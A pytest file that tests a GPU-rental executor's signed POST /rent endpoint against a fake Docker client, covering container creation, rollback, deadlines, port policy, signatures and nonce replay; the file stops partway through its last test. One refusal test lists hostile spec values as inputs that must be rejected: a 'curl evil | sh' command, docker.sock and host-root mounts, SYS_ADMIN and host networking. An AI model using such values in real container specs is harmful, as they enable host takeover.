"""liumd deploy: `POST /rent` — one validator-signed intent, the rental container made in-process.

Fake docker: an `APIClient` stand-in that records the create/start/inspect/remove calls and can be
told to fail, hang or exit the container, so the rollback and the deadline are exercised for real.
"""

from __future__ import annotations

import asyncio
import secrets
import threading
import time
from types import SimpleNamespace

import bittensor
import pytest
import services.local_rent_service as lrs
from datura.rental_spec import (
    RENTAL_NETWORK_ICC_OPTION,
    RENTAL_NETWORK_NAME,
    ContainerRunSpec,
    ContainerUlimit,
    DeviceMount,
    PortBinding,
    VolumeMount,
    spec_to_wire,
)
from fastapi import FastAPI
from fastapi.testclient import TestClient
from middlewares.miner import MinerMiddleware
from payloads.rent import CAPABILITY, SCHEMA, ReadyStep, RentIntentBody, RentSteps
from payloads.verify import CAPABILITY as VERIFY_CAPABILITY
from routes.apis import apis_router
from services.local_rent_service import (
    NONCE_LABEL,
    BusyError,
    LocalRentService,
    host_gateway_ip,
    host_key_sha256,
    refuse_spec,
)
from services.local_verify_service import NonceCache, canonical_intent_message

from core.config import settings
from routes import apis as apis_module

EXECUTOR_UUID = "exec-0001"
HOST_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExecutorHostKey0000000000000000000000000000 root@executor"


class NotFound(Exception):
    def __init__(self, what: str):
        super().__init__(what)
        self.response = SimpleNamespace(status_code=404)


class DaemonError(Exception):
    """docker-py's APIError as the rollback sees it: the daemon answered with an HTTP status
    (a name conflict is a 409, a port bind failure a 500); a socket failure carries no response."""

    def __init__(self, what: str, status_code: int = 500):
        super().__init__(what)
        self.response = SimpleNamespace(status_code=status_code)


class FakeDockerApi:
    """docker.APIClient as `create_and_start` and the rent steps use it."""

    def __init__(self):
        self.calls: list[tuple] = []
        self.made: dict[str, dict] = {}  # by name (`containers()` is the API method)
        self.images = {"daturaai/ubuntu:24.04": {"Id": "sha256:img", "RepoDigests": ["daturaai/ubuntu@sha256:abc"]}}
        self.create_error: Exception | None = None
        self.create_delay_s = 0.0
        self.exit_after_create = False
        self.remove_error: Exception | None = None
        self.networks = {}
        self.lock = threading.Lock()

    def create_host_config(self, **kwargs):
        self.calls.append(("host_config", kwargs))
        return {"HostConfig": kwargs}

    # the host's docker networks by name (`inspect_network` / `create_network`, as ensure_rental_network uses them)
    networks: dict[str, dict] = {}
    create_network_error: Exception | None = None

    def inspect_network(self, name):
        self.calls.append(("inspect_network", name))
        if name not in self.networks:
            raise NotFound(f"network {name} not found")
        return dict(self.networks[name])

    def create_network(self, name, driver=None, options=None, labels=None):
        self.calls.append(("create_network", {"name": name, "driver": driver, "options": options, "labels": labels}))
        if self.create_network_error is not None:
            raise self.create_network_error
        self.networks[name] = {"Name": name, "Driver": driver, "Options": dict(options or {}), "Labels": dict(labels or {})}

    start_error: Exception | None = None
    _next_id = 0

    def _id(self) -> str:
        FakeDockerApi._next_id += 1
        return f"{FakeDockerApi._next_id:064x}"

    def _by(self, ref):
        for name, c in self.made.items():
            if name == ref or c["Id"] == ref or c["Id"].startswith(ref):
                return name, c
        raise NotFound(f"No such container: {ref}")

    create_then_raise: Exception | None = None  # the daemon made it, the answer never arrived

    def create_container(self, **kwargs):
        self.calls.append(("create", kwargs))
        time.sleep(self.create_delay_s)
        if self.create_error is not None:
            raise self.create_error
        with self.lock:
            if kwargs["name"] in self.made:
                raise DaemonError(f'Conflict. The container name "/{kwargs["name"]}" is already in use', status_code=409)
            cid = self._id()
            self.made[kwargs["name"]] = {
                "Id": cid,
                "Labels": dict(kwargs.get("labels") or {}),
                "State": {"Status": "created", "Running": False, "ExitCode": 0, "Error": ""},
            }
        if self.create_then_raise is not None:
            raise self.create_then_raise
        return {"Id": cid}

    def start(self, name):
        self.calls.append(("start", name))
        if self.start_error is not None:
            raise self.start_error
        with self.lock:
            state = self.made[name]["State"]
            if self.exit_after_create:
                state.update(Status="exited", Running=False, ExitCode=127, Error="")
            else:
                state.update(Status="running", Running=True)

    def inspect_container(self, ref):
        self.calls.append(("inspect", ref))
        with self.lock:
            _name, c = self._by(ref)
            return {"Id": c["Id"], "State": dict(c["State"])}

    list_delay_s = 0.0

    def containers(self, all=False, filters=None, quiet=False):
        self.calls.append(("list", filters))
        time.sleep(self.list_delay_s)
        wanted = (filters or {}).get("label")
        with self.lock:
            return [
                {"Id": c["Id"]}
                for c in self.made.values()
                if wanted is None or f"{NONCE_LABEL}={c['Labels'].get(NONCE_LABEL)}" == wanted
            ]

    def inspect_image(self, reference):
        self.calls.append(("inspect_image", reference))
        if reference not in self.images:
            raise NotFound(f"No such image: {reference}")
        return self.images[reference]

    def remove_container(self, ref, v=False, force=False):
        self.calls.append(("remove", ref, v, force))
        if self.remove_error is not None:
            raise self.remove_error
        with self.lock:
            name, _c = self._by(ref)
            del self.made[name]

    def close(self):
        self.calls.append(("close",))

    def removed(self) -> list[str]:
        return [c[1] for c in self.calls if c[0] == "remove"]


def _spec(**overrides) -> ContainerRunSpec:
    fields = dict(
        image="daturaai/ubuntu:24.04",
        name="pod_abc",
        environment={"NVIDIA_DRIVER_CAPABILITIES": "all"},
        ports=(PortBinding(22, 40001), PortBinding(8888, 40002)),
        volumes=(VolumeMount("pod_abc_vol", "/root"),),
        runtime="sysbox-runc",
        network=RENTAL_NETWORK_NAME,
    )
    fields.update(overrides)
    return ContainerRunSpec(**fields)


def _body(**overrides) -> RentIntentBody:
    now = int(time.time())
    fields = dict(
        nonce=secrets.token_hex(16),
        issued_at=now,
        expires_at=now + 120,
        executor_uuid=EXECUTOR_UUID,
        ssh_host_key_sha256=host_key_sha256(HOST_KEY),
        deadline_s=30,
        steps=RentSteps(
            image=True,
            container=spec_to_wire(_spec()),
            ready=ReadyStep(running_timeout_s=2, ssh_host_port=None),
        ),
    )
    fields.update(overrides)
    return RentIntentBody(**fields)


def _service(api: FakeDockerApi, **kw) -> LocalRentService:
    fields = dict(
        executor_version="9.9.9",
        max_deadline_s=120,
        port_range="40000-40009",
        gateway_ip=lambda: "127.0.0.1",
        docker_api=lambda: api,
        host_key=lambda: HOST_KEY,
    )
    fields.update(kw)
    return LocalRentService(**fields)


# --- the service -----------------------------------------------------------------------------


def test_a_good_intent_makes_the_container_with_the_validators_own_calls():
    api = FakeDockerApi()
    result = asyncio.run(_service(api).run(_body()))

    assert result.schema_id == SCHEMA and result.executor_uuid == EXECUTOR_UUID
    assert not result.deadline_hit and not result.rolled_back
    assert result.steps["image"].status == "ok" and result.steps["image"].data["present"]
    assert result.steps["image"].data["digest"] == "daturaai/ubuntu@sha256:abc"
    assert result.steps["container"].status == "ok"
    assert result.steps["container"].data["container_name"] == "pod_abc"
    assert result.steps["ready"].status == "ok" and result.steps["ready"].data["state"]["Running"]
    names = [c[0] for c in api.calls]
    # the icc-off rental network is made sure of BEFORE the container is created on it (DAH-3199)
    assert names[:6] == ["inspect_image", "inspect_network", "create_network", "inspect_network", "host_config", "create"]
    assert "start" in names and "remove" not in names
    create = next(c[1] for c in api.calls if c[0] == "create")
    assert create["name"] == "pod_abc" and create["detach"] is True
    assert create["ports"] == [(22, "tcp"), (8888, "tcp")]
    assert create["environment"] == {"NVIDIA_DRIVER_CAPABILITIES": "all"}
    assert create["volumes"] == ["/root"]
    host = next(c[1] for c in api.calls if c[0] == "host_config")
    assert host["runtime"] == "sysbox-runc"
    assert host["port_bindings"] == {"22/tcp": 40001, "8888/tcp": 40002}
    assert host["binds"] == ["pod_abc_vol:/root:rw"]
    assert host["network_mode"] == RENTAL_NETWORK_NAME
    created_network = next(c[1] for c in api.calls if c[0] == "create_network")
    assert created_network["driver"] == "bridge" and created_network["options"] == {RENTAL_NETWORK_ICC_OPTION: "false"}
    assert create["labels"] == {NONCE_LABEL: result.nonce}  # the rollback's handle, the only addition
    assert result.steps["container"].data["container_id"] == api.made["pod_abc"]["Id"]
    assert "pod_abc" in api.made
    assert ("close",) in api.calls


def test_the_created_container_is_the_same_the_validator_would_make():
    """The executor and the validator call docker-py from ONE function (`create_and_start`):
    the HostConfig kwargs the fake saw equal `build_host_config_kwargs` of the same spec."""
    from datura.rental_spec import build_host_config_kwargs

    api = FakeDockerApi()
    asyncio.run(_service(api).run(_body()))
    host = next(c[1] for c in api.calls if c[0] == "host_config")
    assert host == build_host_config_kwargs(_spec())
    create = next(c[1] for c in api.calls if c[0] == "create")
    assert set(create) - {"labels"} == {"image", "command", "detach", "ports", "environment", "volumes", "name", "entrypoint", "host_config"}


def test_an_existing_icc_off_network_is_reused_and_not_recreated():
    api = FakeDockerApi()
    api.networks[RENTAL_NETWORK_NAME] = {"Name": RENTAL_NETWORK_NAME, "Driver": "bridge", "Options": {RENTAL_NETWORK_ICC_OPTION: "false"}}
    result = asyncio.run(_service(api).run(_body()))
    assert result.steps["container"].status == "ok"
    names = [c[0] for c in api.calls]
    assert "create_network" not in names and names.index("inspect_network") < names.index("create")


@pytest.mark.parametrize(
    "existing",
    [
        pytest.param({"Name": RENTAL_NETWORK_NAME, "Driver": "bridge", "Options": {}}, id="icc-left-on"),
        pytest.param({"Name": RENTAL_NETWORK_NAME, "Driver": "macvlan", "Options": {RENTAL_NETWORK_ICC_OPTION: "false"}}, id="not-a-bridge"),
    ],
)
def test_a_same_named_network_that_does_not_isolate_fails_the_step_and_creates_nothing(existing):
    """Regression: a host where someone made a `lium-rentals` network with ICC on must not get the
    pod anyway (the SSH path refuses it; before this round the local path never looked). The
    executor answers a failed container step with the reason, so the validator's SSH fallback
    hits the same refusal instead of a rental that can reach its neighbours."""
    api = FakeDockerApi()
    api.networks[RENTAL_NETWORK_NAME] = existing
    result = asyncio.run(_service(api).run(_body()))
    assert result.steps["container"].status == "failed"
    assert f"{RENTAL_NETWORK_ICC_OPTION}=false" in result.steps["container"].error
    assert result.steps["ready"].status == "skipped"
    assert "create" not in [c[0] for c in api.calls] and api.made == {}
    # trivially rolled back: no create was ever issued, so no by-label search runs either
    assert result.rolled_back is True and not any(c[0] == "list" for c in api.calls)


def test_a_missing_image_is_a_fact_and_nothing_is_created():
    api = FakeDockerApi()
    body = _body(steps=RentSteps(image=True, container=spec_to_wire(_spec(image="nobody/none:1")), ready=ReadyStep()))
    result = asyncio.run(_service(api).run(body))
    assert result.steps["image"].status == "ok" and result.steps["image"].data == {"present": False}
    assert result.steps["container"].status == "skipped" and result.steps["ready"].status == "skipped"
    assert all(c[0] in ("inspect_image", "close") for c in api.calls)


def test_a_bad_spec_is_refused_before_docker_is_touched():
    api = FakeDockerApi()
    wire = spec_to_wire(_spec())
    wire["surprise"] = 1
    result = asyncio.run(_service(api).run(_body(steps=RentSteps(container=wire))))
    assert result.steps["container"].status == "failed" and "unknown field" in result.steps["container"].error
    assert api.calls == [("close",)]


@pytest.mark.parametrize(
    "overrides, why",
    [
        (dict(command=("bash", "-c", "curl evil | sh")), "command"),
        (dict(entrypoint="/bin/sh"), "entrypoint"),
        (dict(environment={"NVIDIA_DRIVER_CAPABILITIES": "all", "HF_TOKEN": "x"}), "private environment"),
        (dict(environment={}), "private environment"),
        (dict(volumes=(VolumeMount("/", "/host"),)), "host path"),
        (dict(volumes=(VolumeMount("/var/run/docker.sock", "/var/run/docker.sock"),)), "host path"),
        (dict(volumes=(VolumeMount("/var/run/lium-dstack/../docker.sock", "/x"),)), "host path"),
        (dict(volumes=(VolumeMount("../etc", "/x"),)), "volume name"),
        (dict(runtime="kata"), "runtime"),
        (dict(cap_add=("SYS_ADMIN",)), "capabilities"),
        (dict(devices=(DeviceMount("/dev/sda"),)), "device"),
        (dict(devices=(DeviceMount("/dev/nvidia0/../sda"),)), "device"),
        (dict(name="warm_abc"), "container name"),  # the validator names rentals pod_<id> / filler_<id>
        (dict(sysctls={"net.ipv4.ip_forward": "1"}), "sysctls"),
        (dict(sysctls={"net.ipv4.conf.all.src_valid_mark": "0"}), "sysctls"),
        (dict(ulimits=(ContainerUlimit("nofile", 1, 1),)), "ulimits"),
        (dict(network="host"), "network"),  # the host's namespace: every port, every interface
        (dict(network="none"), "network"),
        (dict(network="container:pod_other"), "network"),  # another rental's namespace
        (dict(network="bridge"), "network"),  # docker0 by name: inter-container traffic on
        (dict(network=None), "network"),  # docker0 by omission: the SSH path never builds a rental without the network
    ],
)
def test_a_spec_beyond_a_rentals_is_refused_by_the_executor_whoever_signed_it(overrides, why):
    """The sender's rule (`carries_only_public_fields`) is enforced HERE too: the validator hotkey
    alone must not run anything but a rental's image with a rental's mounts on this host."""
    api = FakeDockerApi()
    result = asyncio.run(_service(api).run(_body(steps=RentSteps(container=spec_to_wire(_spec(**overrides))))))
    assert result.steps["container"].status == "failed", result.steps["container"]
    assert why in result.steps["container"].error
    assert api.calls == [("close",)]


def test_a_rentals_own_extras_pass_the_executors_policy():
    spec = _spec(
        name="filler_abc",
        volumes=(VolumeMount("pod_abc_vol", "/root"), VolumeMount("ext-vol_1", "/mnt"),
                 VolumeMount("/var/run/lium-dstack/dstack.sock", "/var/run/dstack.sock", read_only=True)),
        runtime="sysbox-runc",
        cap_add=("NET_ADMIN", "IPC_LOCK"),
        sysctls={"net.ipv4.conf.all.src_valid_mark": "1"},
        ulimits=(ContainerUlimit("memlock", -1, -1),),
        devices=(DeviceMount("/dev/net/tun", "/dev/net/tun"), DeviceMount("/dev/fuse"), DeviceMount("/dev/nvidia0"),
                 DeviceMount("/dev/infiniband/uverbs0")),
    )
    assert refuse_spec(spec) is None
    assert refuse_spec(_spec(runtime=None)) is None


@pytest.mark.parametrize(
    "port, ssh_port",
    [(22, 2222), (40010, 2222), (2222, 2222), (40005, 40005)],  # the last: the executor's own sshd port INSIDE the range
)
def test_a_port_outside_this_executors_rental_ports_or_on_its_own_sshd_is_refused(port, ssh_port):
    api = FakeDockerApi()
    spec = _spec(ports=(PortBinding(22, port),))
    service = LocalRentService(
        executor_version="v", max_deadline_s=60, port_range="40000-40009", ssh_port=ssh_port, docker_api=lambda: api
    )
    result = asyncio.run(service.run(_body(steps=RentSteps(container=spec_to_wire(spec)))))
    assert result.steps["container"].status == "failed"
    assert "not one of this executor's rental ports" in result.steps["container"].error
    assert api.calls == [("close",)]


def test_an_executor_with_no_configured_ports_offers_the_validators_default_range():
    api = FakeDockerApi()
    service = LocalRentService(executor_version="v", max_deadline_s=60, docker_api=lambda: api)
    assert 20000 in service.offered_ports() and 65535 in service.offered_ports() and 19999 not in service.offered_ports()
    result = asyncio.run(service.run(_body(steps=RentSteps(container=spec_to_wire(_spec(ports=(PortBinding(22, 20000),)))))))
    assert result.steps["container"].status == "ok"


def test_port_mappings_offer_their_internal_side_the_one_docker_binds_on_the_host():
    """`RENTING_PORT_MAPPINGS` is `[[internal, external]]`: docker publishes on the internal port
    (the validator's spec names it — `_published_ports` binds `host_port=internal_port`) and the
    renter dials the external one through the provider's NAT. The executor must accept the side
    the spec carries, or every proxied executor would refuse its own rentals."""
    api = FakeDockerApi()
    service = LocalRentService(
        executor_version="v", max_deadline_s=60, port_mappings="[[46681, 56681], [8888, 31888]]", docker_api=lambda: api
    )
    assert service.offered_ports() == {46681, 8888}
    result = asyncio.run(service.run(_body(steps=RentSteps(container=spec_to_wire(_spec(ports=(PortBinding(22, 46681),)))))))
    assert result.steps["container"].status == "ok"
    external = asyncio.run(service.run(_body(steps=RentSteps(container=spec_to_wire(_spec(ports=(PortBinding(22, 56681),)))))))
    assert external.steps["container"].status == "failed" and "rental ports" in external.steps["container"].error


def test_a_refusal_before_any_create_answers_rolled_back_since_nothing_of_ours_can_exist():
    """`rolled_back=True` is "nothing the executor made remains" — trivially true when no create was
    issued; the validator then skips the force-remove of the name before its own `docker run`."""
    api = FakeDockerApi()
    refused = asyncio.run(_service(api).run(_body(steps=RentSteps(container=spec_to_wire(_spec(command=("sh",)))))))
    assert refused.steps["container"].status == "failed" and refused.rolled_back is True
    absent = asyncio.run(
        _service(api).run(_body(steps=RentSteps(image=True, container=spec_to_wire(_spec(image="nobody/none:1")))))
    )
    assert absent.steps["container"].status == "skipped" and absent.rolled_back is True
    assert all(c[0] in ("inspect_image", "close") for c in api.calls)


def test_the_sshd_probe_may_only_dial_a_port_this_spec_publishes():
    """An intent must not turn the executor into a probe of the host's other ports: a `ready`
    step naming a host port the spec does not publish is refused before docker is touched."""
    api = FakeDockerApi()
    body = _body(
        steps=RentSteps(
            container=spec_to_wire(_spec(ports=(PortBinding(22, 40001),))),
            ready=ReadyStep(ssh_host_port=40002, ssh_timeout_s=1),
        )
    )
    result = asyncio.run(_service(api).run(body))
    assert result.steps["container"].status == "failed" and "ssh_host_port 40002" in result.steps["container"].error
    assert result.steps["ready"].status == "skipped" and api.calls == [("close",)]


def test_no_docker_client_is_a_failed_container_step_with_nothing_to_roll_back():
    """The client is built off the event loop (docker-py's constructor asks the daemon for its API
    version); when it cannot be built nothing was created — the validator's SDK path runs as today."""

    def no_socket():
        raise ConnectionError("no docker socket")

    service = LocalRentService(executor_version="v", max_deadline_s=60, docker_api=no_socket)
    result = asyncio.run(service.run(_body()))
    assert result.steps["container"].status == "failed" and "docker client" in result.steps["container"].error
    assert result.steps["ready"].status == "skipped" and result.steps["image"].status == "skipped"
    assert result.rolled_back is True and result.deadline_hit is False


def test_a_create_the_daemon_refuses_is_a_failed_step_and_nothing_is_removed():
    api = FakeDockerApi()
    api.create_error = DaemonError("Bind for 0.0.0.0:40001 failed: port is already allocated")
    result = asyncio.run(_service(api).run(_body()))
    assert result.steps["container"].status == "failed"
    assert "port is already allocated" in result.steps["container"].error
    assert result.steps["ready"].status == "skipped"
    # The daemon refused the create: nothing of ours exists, nothing is removed — least of all by
    # name, which could be somebody else's container — and no label pass is needed.
    assert api.removed() == []
    assert ("list", {"label": f"{NONCE_LABEL}={result.nonce}"}) not in api.calls
    assert result.rolled_back is True


def test_a_create_that_failed_on_the_socket_is_looked_up_by_label_before_rolled_back_is_answered():
    """A daemon that restarted mid-create (docker-py raises a requests ConnectionError, no HTTP
    status) may have finished the create: `rolled_back` is answered from the label look-up, never
    from the exception alone — a True here without a look would leave the name held while the
    validator's SDK `run` reuses it."""
    api = FakeDockerApi()
    api.create_then_raise = ConnectionError("Connection aborted: daemon restarting")
    result = asyncio.run(_service(api).run(_body()))
    assert result.steps["container"].status == "failed"
    assert "daemon restarting" in result.steps["container"].error
    assert ("list", {"label": f"{NONCE_LABEL}={result.nonce}"}) in api.calls
    assert api.made == {} and len(api.removed()) == 1  # ours, found by label, removed by id
    assert result.rolled_back is True


def test_a_start_that_fails_after_the_create_removes_by_the_id_the_create_answered():
    """DAH-2018: the daemon reserves the name at create and a port-bind failure at start leaves a
    Created container holding it — removed by ID, so the SSH fallback's `docker run` goes through."""
    api = FakeDockerApi()
    api.start_error = RuntimeError("Bind for 0.0.0.0:40001 failed: port is already allocated")
    result = asyncio.run(_service(api).run(_body()))
    assert result.steps["container"].status == "failed"
    assert result.rolled_back is True and "pod_abc" not in api.made
    (removed,) = api.removed()
    assert len(removed) == 64  # the id, never the name


def test_a_name_already_in_use_is_somebody_elses_container_and_is_left_alone():
    api = FakeDockerApi()
    api.made["pod_abc"] = {"Id": "f" * 64, "Labels": {}, "State": {"Status": "running", "Running": True}}
    result = asyncio.run(_service(api).run(_body()))
    assert result.steps["container"].status == "failed" and "already in use" in result.steps["container"].error
    assert result.rolled_back is True  # nothing of OURS remains
    assert api.removed() == [] and "pod_abc" in api.made


def test_a_container_that_exits_is_rolled_back_and_reported():
    api = FakeDockerApi()
    api.exit_after_create = True
    result = asyncio.run(_service(api).run(_body()))
    assert result.steps["container"].status == "ok"
    assert result.steps["ready"].status == "failed" and "exit 127" in result.steps["ready"].error
    assert result.rolled_back is True and "pod_abc" not in api.made
    (removed,) = api.removed()
    assert len(removed) == 64  # by id


def test_the_deadline_cuts_a_hanging_create_and_the_late_container_is_removed_by_label():
    """The create is still in the daemon's hands when the deadline answers: nothing is found by our
    label yet, the answer says rolled_back=False (the validator frees the name itself), and the
    second pass finds the container the daemon finished — by label, never by name — and removes it."""
    api = FakeDockerApi()
    api.create_delay_s = 1.5  # past the 1 s cap below: the daemon "finishes" after the answer left
    service = _service(api, max_deadline_s=1)  # the operator's cap wins over the intent's 5 s

    async def scenario():
        result = await service.run(_body(deadline_s=5))
        after_answer = "pod_abc" in api.made
        await asyncio.sleep(1.6)  # the hung create lands; then the second pass runs
        return result, after_answer

    lrs_retry = lrs.ROLLBACK_RETRY_SECONDS
    lrs.ROLLBACK_RETRY_SECONDS = 1.0
    try:
        started = time.perf_counter()
        result, after_answer = asyncio.run(scenario())
    finally:
        lrs.ROLLBACK_RETRY_SECONDS = lrs_retry
    assert result.deadline_hit and result.elapsed_ms < 1500
    assert result.steps["container"].status == "timeout"
    assert result.rolled_back is False and after_answer is False  # not provable at answer time
    lists = [c for c in api.calls if c[0] == "list"]
    assert len(lists) == 2 and all(c[1] == {"label": f"{NONCE_LABEL}={result.nonce}"} for c in lists)
    (removed,) = api.removed()
    assert len(removed) == 64 and "pod_abc" not in api.made  # found by label, removed by id
    assert time.perf_counter() - started < 4


def test_a_cut_create_the_daemon_had_finished_is_found_by_label_at_once():
    """Between the deadline and the label lookup the daemon finishes the create: found, removed by
    id, and the answer can say rolled_back=True."""
    api = FakeDockerApi()
    api.create_delay_s = 1.2
    api.list_delay_s = 0.5  # the lookup lands after the create did
    service = _service(api, max_deadline_s=1)
    result = asyncio.run(service.run(_body(deadline_s=5)))
    assert result.deadline_hit and result.rolled_back is True
    assert "pod_abc" not in api.made and len(api.removed()) == 1


def test_a_container_of_the_same_name_made_by_someone_else_is_never_touched_by_the_rollback():
    """The validator's SSH fallback may create pod_abc while ours exits after the create: the by-id
    rollback removes ours and leaves the other one (the label pass's filter is pinned by the
    deadline test's `lists` assertion)."""
    api = FakeDockerApi()
    api.exit_after_create = True
    service = _service(api)
    # The rollback runs against a daemon where another, unlabelled pod_abc appeared meanwhile.
    real_remove = api.remove_container

    def remove(ref, v=False, force=False):
        real_remove(ref, v=v, force=force)
        api.made["pod_abc"] = {"Id": "e" * 64, "Labels": {}, "State": {"Status": "running", "Running": True}}

    api.remove_container = remove
    result = asyncio.run(service.run(_body()))
    assert result.rolled_back is True
    assert api.made["pod_abc"]["Id"] == "e" * 64  # the other one is still there


def test_a_failed_rollback_is_reported_as_not_rolled_back():
    api = FakeDockerApi()
    api.exit_after_create = True
    api.remove_error = RuntimeError("daemon is wedged")
    result = asyncio.run(_service(api).run(_body()))
    assert result.rolled_back is False


def test_sshd_readiness_is_the_ssh_banner_on_the_published_port():
    api = FakeDockerApi()

    def banner(_reader, writer):
        writer.write(b"SSH-2.0-OpenSSH_9.6\r\n")
        writer.close()

    async def scenario():
        server = await asyncio.start_server(banner, "127.0.0.1", 0)
        port = server.sockets[0].getsockname()[1]
        service = LocalRentService(
            executor_version="v",
            max_deadline_s=60,
            # [internal, external]: the spec publishes on the internal side, the one docker binds here
            port_mappings=f"[[{port}, 56681]]",
            gateway_ip=lambda: "127.0.0.1",
            docker_api=lambda: api,
        )
        spec = _spec(ports=(PortBinding(22, port),))
        body = _body(steps=RentSteps(container=spec_to_wire(spec), ready=ReadyStep(ssh_host_port=port, ssh_timeout_s=3)))
        answered = await service.run(body)
        server.close()
        await server.wait_closed()
        silent = await service.run(
            _body(
                steps=RentSteps(
                    container=spec_to_wire(_spec(name="pod_def", ports=(PortBinding(22, port),))),
                    ready=ReadyStep(ssh_host_port=port, ssh_timeout_s=1),
                )
            )
        )
        return answered, silent

    answered, silent = asyncio.run(scenario())
    assert answered.steps["ready"].status == "ok" and answered.steps["ready"].data["ssh_answered"] is True
    assert answered.steps["ready"].data["ssh_probe_host"] == "127.0.0.1"
    assert not answered.rolled_back
    assert silent.steps["ready"].status == "timeout" and silent.rolled_back is True


def test_a_port_that_accepts_but_says_nothing_is_not_sshd():
    """Docker's userland proxy accepts on the published port before sshd listens inside: a bare
    connect (or a non-SSH greeting) must not count."""
    api = FakeDockerApi()

    def mute(_reader, writer):
        writer.write(b"HTTP/1.1 400 Bad Request\r\n")
        writer.close()

    async def scenario():
        server = await asyncio.start_server(mute, "127.0.0.1", 0)
        port = server.sockets[0].getsockname()[1]
        service = LocalRentService(
            executor_version="v", max_deadline_s=60, port_mappings=f"[[{port}, 56681]]",
            gateway_ip=lambda: "127.0.0.1", docker_api=lambda: api,
        )
        spec = _spec(ports=(PortBinding(22, port),))
        result = await service.run(
            _body(steps=RentSteps(container=spec_to_wire(spec), ready=ReadyStep(ssh_host_port=port, ssh_timeout_s=1)))
        )
        server.close()
        await server.wait_closed()
        return result

    result = asyncio.run(scenario())
    assert result.steps["ready"].status == "timeout" and result.steps["ready"].data["ssh_answered"] is False
    assert result.rolled_back is True


def test_second_concurrent_intent_is_refused_as_busy():
    api = FakeDockerApi()
    api.create_delay_s = 0.3
    service = _service(api)

    async def scenario():
        first = asyncio.ensure_future(service.run(_body()))
        await asyncio.sleep(0.05)
        with pytest.raises(BusyError):
            await service.run(_body())
        return await first

    result = asyncio.run(scenario())
    assert result.steps["container"].status == "ok"


def test_host_gateway_ip_reads_the_default_route():
    table = (
        "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
        "eth0\t00000000\t010011AC\t0003\t0\t0\t0\t00000000\t0\t0\t0\n"
        "eth0\t000011AC\t00000000\t0001\t0\t0\t0\t0000FFFF\t0\t0\t0\n"
    )
    assert host_gateway_ip(table) == "172.17.0.1"
    assert host_gateway_ip("Iface\tDestination\n") is None


# --- the route -------------------------------------------------------------------------------


@pytest.fixture(scope="module")
def validator_keypair():
    return bittensor.Keypair.create_from_uri("//LiumTestValidator")


@pytest.fixture()
def client(validator_keypair, monkeypatch):
    api = FakeDockerApi()
    monkeypatch.setattr("dependencies.auth.VALIDATOR_HOTKEY_SS58", validator_keypair.ss58_address)
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_RENT_ENABLED", True)
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_ENABLED", False)
    monkeypatch.setattr(settings, "RENTING_PORT_RANGE", "40000-40009")
    monkeypatch.setattr(apis_module, "_local_rent_service", None)
    monkeypatch.setattr(apis_module, "_local_verify_nonces", NonceCache())
    monkeypatch.setattr(lrs, "_docker_api", lambda: api)
    monkeypatch.setattr("services.ssh_service.SSHService.get_host_public_key", lambda self: HOST_KEY)
    app = FastAPI()
    app.add_middleware(MinerMiddleware)
    app.include_router(apis_router)
    test_client = TestClient(app)
    test_client.fake_api = api
    return test_client


def _signed(body: RentIntentBody, keypair) -> dict:
    wire = body.model_dump(by_alias=True)
    wire["signature"] = "0x" + keypair.sign(canonical_intent_message(wire)).hex()
    return wire


def test_version_advertises_rent_with_its_own_flag(client, monkeypatch):
    assert client.get("/version").json()["capabilities"] == [CAPABILITY]
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_ENABLED", True)
    assert client.get("/version").json()["capabilities"] == [VERIFY_CAPABILITY, CAPABILITY]
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_RENT_ENABLED", False)
    assert client.get("/version").json()["capabilities"] == [VERIFY_CAPABILITY]


def test_flag_off_is_404(client, validator_keypair, monkeypatch):
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_RENT_ENABLED", False)
    assert client.post("/rent", json=_signed(_body(), validator_keypair)).status_code == 404
    assert client.fake_api.calls == []


def test_a_signed_intent_makes_the_container(client, validator_keypair):
    response = client.post("/rent", json=_signed(_body(), validator_keypair))
    assert response.status_code == 200, response.text
    result = response.json()
    assert result["schema"] == SCHEMA and result["steps"]["container"]["status"] == "ok"
    assert "pod_abc" in client.fake_api.made


def test_wrong_key_or_tampered_spec_is_401_and_nothing_is_made(client, validator_keypair):
    stranger = bittensor.Keypair.create_from_uri("//Stranger")
    assert client.post("/rent", json=_signed(_body(), stranger)).status_code == 401
    tampered = _signed(_body(), validator_keypair)
    tampered["steps"]["container"]["ports"][0]["host_port"] = 40005
    assert client.post("/rent", json=tampered).status_code == 401
    assert client.fake_api.calls == []


def test_a_nonce_is_one_cache_with_verify(client, validator_keypair, monkeypatch):
    intent = _signed(_body(), validator_keypair)
    assert client.post("/rent", json=intent).status_code == 200
    replay = client.post("/rent", json=intent)
    assert replay.status_code == 409 and "nonce" in replay.text
    # The same nonce on /verify (its own schema, freshly signed) is refused before any step runs.
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_ENABLED", True)
    verify = {
        "schema": "lium.local_verify/1", "nonce": intent["nonce"], "issued_at": intent["issued_at"],
        "expires_at": intent["expires_at"], "executor_uuid": EXECUTOR_UUID, "deadline_s": 30,
        "parallel_gpu": False, "steps": {"inspector": True},
    }
    verify["signature"] = "0x" + validator_keypair.sign(canonical_intent_message(verify)).hex()
    crossed = client.post("/verify", json=verify)
    assert crossed.status_code == 409 and "nonce" in crossed.text


def test_an_intent_bound_to_another_executors_host_key_is_refused(client, validator_keypair):
    other = _body(ssh_host_key_sha256=host_key_sha256("ssh-ed25519 AAAA-somebody-else root@other"))
    response = client.post("/rent", json=_signed(other, validator_keypair))
    assert response.status_code == 401 and "host key" in response.text
    assert client.fake_api.calls == []


def test_an_executor_without_a_host_key_takes_no_intent(client, validator_keypair, monkeypatch):
    monkeypatch.setattr(apis_module, "_local_rent_service", None)
    monkeypatch.setattr("services.ssh_service.SSHService.get_host_public_key", lambda self: None)
    response = client.post("/rent", json=_signed(_body(), validator_keypair))
    assert response.status_code == 401 and client.fake_api.calls == []


def test_expired_or_skewed_intent_is_401(client, validator_keypair):
    now = int(time.time())
    assert client.post("/rent", json=_signed(_body(issued_at=now - 300, expires_at=now - 10), validator_keypair)).status_code == 401
    assert client.post("/rent", json=_signed(_body(issued_at=now + 600, expires_at=now + 700), validator_keypair)).status_code == 401


def test_a_malformed_intent_is_422_before_any_signature_check(client):
